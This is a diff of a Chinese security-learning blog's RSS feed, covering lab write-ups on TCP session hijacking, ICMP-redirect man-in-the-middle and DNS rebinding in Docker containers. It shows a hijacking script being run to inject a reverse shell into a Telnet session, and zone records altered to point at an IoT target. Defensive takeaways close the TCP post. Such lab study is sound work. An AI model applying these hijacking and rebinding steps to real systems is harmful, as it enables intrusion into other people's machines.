+&lt;h3 id=&#34;执行劫持&#34;&gt;执行劫持
+&lt;/h3&gt;&lt;p&gt;在攻击者原来的终端中运行会话劫持脚本&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 hijacking_auto.py 10.9.0.5 10.9.0.6
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;回到受害者 Telnet 界面，连续输入 10 个字符触发脚本注入&lt;/p&gt;
+&lt;img src=&#34;12.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;h3 id=&#34;验证-3&#34;&gt;验证
+&lt;/h3&gt;&lt;p&gt;回到攻击者监听 &lt;code&gt;9090&lt;/code&gt; 端口的窗口，如果攻击成功，可以看到来自 &lt;code&gt;10.9.0.6&lt;/code&gt; 的连接，并获得目标主机的命令执行环境&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hostname
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip addr
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;13.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;p&gt;这说明攻击者已经通过 TCP 会话劫持向 Telnet 会话中注入了反向 Shell 命令，并让目标主机主动连接攻击者&lt;/p&gt;
+&lt;h2 id=&#34;实验结论&#34;&gt;实验结论
+&lt;/h2&gt;&lt;p&gt;本次实验展示了 TCP 协议在不同场景下可能受到的攻击方式。SYN 洪泛攻击利用的是连接建立阶段的半连接状态，TCP Reset 攻击利用的是 RST 报文对已有连接的控制能力，TCP 会话劫持利用的是明文协议和 TCP 状态可伪造的问题，反向 Shell 则是在命令注入成功后的进一步利用&lt;/p&gt;
+&lt;p&gt;这几个实验的共同点是攻击者都需要让伪造数据包看起来符合当前 TCP 状态。源 IP、目标 IP、端口、序列号和确认号只要有关键字段不匹配，目标主机就可能直接丢弃数据包&lt;/p&gt;
+&lt;p&gt;从实验过程可以看出，TCP 本身只负责可靠传输，并不会验证通信双方的真实身份。对于 Telnet 这类明文协议来说，一旦攻击者能够监听或伪造会话数据，连接就很容易被干扰或劫持。实际环境中通常需要依赖 SSH、TLS、SYN Cookie、随机化初始序列号、防火墙规则等机制降低这类攻击的风险&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>基于RISC-V架构的操作系统学习</title>
         <link>https://th4uma.github.io/post/risc-v/</link>
         <pubDate>Wed, 13 May 2026 19:17:02 +0800</pubDate>
@@ -1528,7 +1829,6 @@
 &lt;p&gt;Program Header&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Program Header的作用是存储将程序加载到内存相关的参数&lt;/p&gt;
-&lt;p&gt;你这里的输出是：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2467,7 +2767,7 @@
         <description>&lt;img src="https://th4uma.github.io/images/cover/icmp.jpg" alt="Featured image of post ICMP重定向与中间人攻击" /&gt;&lt;h2 id=&#34;实验环境&#34;&gt;实验环境
 &lt;/h2&gt;&lt;p&gt;我使用的是 Ubuntu  24.04.4，基本环境配置见&lt;a class=&#34;link&#34; href=&#34;https://th4uma.github.io/post/arp/#%e5%87%86%e5%a4%87&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;ARP攻击原理学习&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;启动实验前，对容器环境进行清理，避免历史网络配置干扰&lt;/p&gt;
+&lt;p&gt;启动实验前，对容器环境进行清理，避免之前的网络配置干扰&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2501,7 +2801,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;/blockquote&gt;
-&lt;p&gt;容器全部启动后，网络结构包括受害者、攻击者、真实网关、恶意路由器以及目标主机&lt;/p&gt;
+&lt;p&gt;网络结构包括受害者、攻击者、真实网关、恶意路由器以及目标主机&lt;/p&gt;
 &lt;table&gt;
   &lt;thead&gt;
       &lt;tr&gt;
@@ -2539,13 +2839,12 @@
       &lt;tr&gt;
           &lt;td&gt;&lt;strong&gt;Docker 网关&lt;/strong&gt;&lt;/td&gt;
           &lt;td&gt;&lt;code&gt;10.9.0.1&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;Docker 虚拟网络的默认出口。在实验中不参与路由转发&lt;/td&gt;
+          &lt;td&gt;Docker 虚拟网络的默认出口，不参与实验&lt;/td&gt;
       &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;h2 id=&#34;icmp-重定向攻击&#34;&gt;ICMP 重定向攻击
-&lt;/h2&gt;&lt;p&gt;ICMP Redirect 用于局域网优化路径。当主机将数据包发送给网关时，如果网关发现存在更优路径，会返回一个重定向报文，引导主机更新路由缓存，之后的数据包就会经过新的网关。这个机制缺乏认证过程，只要报文结构合法且来源看似可信，就有可能被内核接受，因此可以伪造重定向来进行攻击&lt;/p&gt;
-&lt;p&gt;ICMP 重定向并不是无条件生效，需要存在对应的通信流量，否则内核可能直接忽略报文。路由缓存存在时间限制，实验操作需要在有效期内完成，否则需要重新触发攻击&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;ICMP Redirect 用于局域网优化路径。主机将数据包发送给网关时，如果网关发现存在更优的路径，会返回一个重定向报文来让主机更新路由缓存，之后的数据包就会经过新的网关。这个机制缺少认证，只要报文结构合法而且来源看似可信，就有可能被内核接受，因此可以伪造重定向来进行攻击&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;攻击目标是修改受害者的路由缓存，让受害者发往目标主机的流量途经恶意路由器&lt;/strong&gt;&lt;/p&gt;
 &lt;h3 id=&#34;受害者&#34;&gt;受害者
 &lt;/h3&gt;&lt;blockquote&gt;
@@ -2789,7 +3088,7 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;还是失败了，又把最开始的&lt;code&gt;.11&lt;/code&gt;添加回去，依旧不行，说明实验确实无法正常完成，只能进行模拟&lt;/p&gt;
 &lt;h2 id=&#34;中间人攻击&#34;&gt;中间人攻击
-&lt;/h2&gt;&lt;p&gt;攻击的核心并不是重定向本身，而是通过重定向使流量经过攻击者，实现对流量的控制。此时攻击者已经处于通信路径中间，但默认情况下数据仍然是直接转发的，需要对数据进行拦截和修改&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;攻击的核心并不是重定向本身，而是通过重定向使流量经过攻击者，实现对流量的控制。此时攻击者已经处于通信路径中间，但默认情况下数据仍然是直接转发的，需要对数据进行拦截和修改。路由缓存有时间限制，中间人攻击需要在有效期内完成，否则需要重新进行重定向攻击&lt;/p&gt;
 &lt;h3 id=&#34;通信&#34;&gt;通信
 &lt;/h3&gt;&lt;p&gt;在目标主机上开启监听&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -8174,8 +8473,7 @@
 &lt;/blockquote&gt;
 &lt;p&gt;实验成功后，在源码目录执行 &lt;code&gt;make clean&lt;/code&gt; 清除编译文件&lt;/p&gt;
 &lt;h2 id=&#34;附ubuntu-和-openeuler-的差异&#34;&gt;附：Ubuntu 和 openEuler 的差异
-&lt;/h2&gt;&lt;p&gt;我使用的Ubuntu和课程中的 openEuler 内核编译逻辑相同，但具体的路径和构建目标不同。选择 Ubuntu 是因为社区文档更完善，而且对我之后的学习更有帮助&lt;/p&gt;
-&lt;table&gt;
+&lt;/h2&gt;&lt;table&gt;
   &lt;thead&gt;
       &lt;tr&gt;
           &lt;th&gt;&lt;strong&gt;对比项&lt;/strong&gt;&lt;/th&gt;
@@ -8925,16 +9223,15 @@
 &lt;/table&gt;
 &lt;h2 id=&#34;修改firefox浏览器的dns缓存时间&#34;&gt;修改Firefox浏览器的DNS缓存时间
 &lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;Firefox 浏览器默认会缓存 DNS 查询结果 60 秒。为了提高实验效率，让 DNS 重绑定攻击能快速生效，需要人为缩短缓存时间&lt;/p&gt;
+&lt;p&gt;Firefox 浏览器默认会缓存 DNS 查询结果 60 秒。为了让 DNS 重绑定攻击能快速生效，需要人为缩短缓存时间&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;在 Firefox 浏览器地址栏输入 &lt;code&gt;about:config&lt;/code&gt;并回车，接受风险提示，然后在搜索栏输入&lt;code&gt;network.dnsCacheExpiration&lt;/code&gt;&lt;/p&gt;
 &lt;img src=&#34;1.png&#34; style=&#34;width: 60%;&#34; /&gt;
-&lt;p&gt;双击出现的两个结果&lt;code&gt;network.dnsCacheExpiration&lt;/code&gt;和&lt;code&gt;network.dnsCacheExpirationGracePeriod&lt;/code&gt;，将值更改为10秒，重启浏览器使配置生效&lt;/p&gt;
+&lt;p&gt;双击出现的两个结果&lt;code&gt;network.dnsCacheExpiration&lt;/code&gt;和&lt;code&gt;network.dnsCacheExpirationGracePeriod&lt;/code&gt;，将值更改为10秒，重启浏览器使配置生效，这样可以更快触发二次解析&lt;/p&gt;
 &lt;img src=&#34;2.png&#34; style=&#34;width: 100%;&#34; /&gt;
-&lt;p&gt;这样可以更快触发二次解析&lt;/p&gt;
 &lt;h2 id=&#34;配置本地dns服务器&#34;&gt;配置本地DNS服务器
 &lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;Ubuntu 24.04 使用 systemd-resolved 管理 DNS，&lt;code&gt;/etc/resolv.conf&lt;/code&gt; 是自动生成的文件，不应该直接编辑。为了保证实验过程中 DNS 可控，采用替换&lt;code&gt;resolv.conf&lt;/code&gt;的方式&lt;/p&gt;
+&lt;p&gt;Ubuntu 24.04 使用 systemd-resolved 管理 DNS，&lt;code&gt;/etc/resolv.conf&lt;/code&gt; 是自动生成的文件，不应该直接编辑。为了完成实验，我对&lt;code&gt;resolv.conf&lt;/code&gt;进行了替换&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;备份原配置&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -8963,7 +9260,7 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nameserver 10.9.0.53
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;实验完成后，执行以下命令即可恢复，不会影响正常的网络使用&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;实验完成后，执行以下命令即可恢复原本的配置&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -9141,9 +9438,8 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nano /etc/bind/zone_attacker32.com
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;修改：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;将 TTL 设为较小值&lt;/li&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;将 TTL 设为比较小的值，让缓存更快更新&lt;/li&gt;
 &lt;li&gt;找到 www 对应的记录，将 IP 篡改为 IoT 靶机 IP，保存退出&lt;/li&gt;
 &lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -9327,7 +9623,7 @@
 &lt;/div&gt;&lt;img src=&#34;16.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;p&gt;尝试清除浏览器缓存，关闭安全浏览和doh都无效，访问域名会提示不安全一秒左右，然后跳转到错误的页面。最后通过替换&lt;code&gt;resolv.conf&lt;/code&gt;使域名可以正常访问&lt;/p&gt;
 &lt;h3 id=&#34;攻击者域名未重绑定iot设备&#34;&gt;攻击者域名未重绑定iot设备
-&lt;/h3&gt;&lt;p&gt;重新加载 DNS 配置，清空缓存这一步我输入了下面的命令&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;重新加载 DNS 配置，清空缓存这一步我输入了下面的命令，但回到浏览器发现依旧报错405&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -9338,10 +9634,9 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;rndc&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flush&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;但回到浏览器发现依旧报错405&lt;/p&gt;
-&lt;p&gt;最后尝试先执行第一个命令，然后exit退出并重新进入容器，再执行第二个命令，问题解决&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;最后尝试先执行第一个命令，然后exit退出并重新进入容器，再执行第二个命令，问题解决&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;这是因为在连续输入命令时，BIND 服务的配置重载尚未完成，就执行了缓存清空，导致本地 DNS 仍然抓取并缓存了旧的解析记录&lt;/p&gt;
+&lt;p&gt;这是因为在连续输入命令时，BIND 服务的配置还没有重新加载完成就执行了清空缓存，导致实际上并没有起作用，本地 DNS 仍然缓存了旧的解析记录&lt;/p&gt;
 &lt;/blockquote&gt;
 </description>
         </item>
